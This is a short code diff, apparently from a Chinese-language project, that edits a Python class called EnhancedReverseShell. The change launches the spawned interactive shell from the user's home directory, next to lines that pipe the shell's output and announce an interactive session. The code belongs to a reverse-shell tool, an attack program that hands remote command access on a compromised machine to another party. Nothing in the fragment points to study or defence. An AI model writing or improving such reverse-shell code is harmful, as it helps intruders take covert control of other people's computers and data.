@@ -540,6 +540,7 @@ class EnhancedReverseShell:
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
                     bufsize=0,
+                    cwd=os.path.expanduser("~"),  # 从家目录启动，而不是项目文件夹
                 )
                 self.socket.settimeout(None)
                 print("[会话] Shell 已启动，进入交互模式")
